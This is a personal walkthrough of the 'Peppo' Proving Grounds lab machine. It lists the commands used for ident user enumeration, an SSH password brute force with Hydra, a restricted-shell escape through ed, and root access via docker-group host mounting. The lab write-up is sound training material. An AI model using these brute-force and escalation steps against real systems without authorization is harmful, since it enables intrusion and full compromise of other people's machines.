
# 🐧 Peppo (Linux)

📄 [Walkthrough](https://al1z4deh.medium.com/proving-grounds-peppo-931ae40ec1a2)

---

## 🚪 Initial Foothold

🔍 **Port 113** (ident)

Used [`ident-user-enum`](http://pentestmonkey.net/tools/ident-user-enum) to enumerate users:
```bash
ident-user-enum $IP 113
```

🔑 Discovered user `eleanor`.

Used **Hydra** for brute force:
```bash
hydra -l eleanor -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

✅ Found valid credentials: `eleanor:eleanor`.

🔐 SSH login:
```bash
ssh eleanor@$IP
```

📁 Checked the user’s `$PATH`:
```bash
echo $PATH
# Output: /home/eleanor/bin
```

🧩 Found suspicious binary `ed` in `/home/eleanor/bin`:
```bash
ls -la /home/eleanor/bin
```

👀 Inside `ed`:
```bash
ed
! /bin/bash
```

🏃 Escaped to a shell and exported a valid PATH to ensure system binaries are reachable:
```bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

---

## 🧑‍🚀 Privilege Escalation

📎 Ran `linpeas.sh` to enumerate privilege escalation vectors.

🔎 Found the user is in the **docker group** (dangerous!):
📚 [Docker Group Exploitation Guide](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#docker-group)

🐳 Listed available Docker images:
```bash
docker images
```

📦 Chose an image and mounted the host filesystem:
```bash
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
```

👑 Got root!

---

## 🧰 Git Commands (Personalized)

```bash
# Move the file to the linux walkthroughs folder
mv ~/Downloads/Peppo.md ~/Downloads/walkthroughs_project_template/linux/Peppo.md

# Change directory to the project root
cd ~/Downloads/walkthroughs_project_template

# Add all changes to git
git add .

# Commit the changes with a descriptive message
git commit -m "Added Peppo (Linux) walkthrough"

# Push the commit to GitHub
git push
```
